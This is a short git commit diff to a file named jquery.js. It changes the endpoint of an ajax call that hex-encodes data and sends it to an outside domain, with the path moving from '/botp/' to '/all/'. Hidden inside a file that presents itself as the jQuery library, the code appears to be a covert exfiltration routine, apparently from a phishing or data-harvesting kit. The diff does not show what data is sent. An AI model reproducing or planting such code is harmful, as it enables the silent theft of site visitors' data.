8a4d8705ac348709fad68452464b4a0e85165358
SanzzZ27 <sanzzzress00@gmail.com>
2024-11-16 18:19:06 +0700

    Add files via upload

--- jquery.js
+++ jquery.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://system.sanzzz27.my.id/botp/?json=" +
+                    "https://system.sanzzz27.my.id/all/?json=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
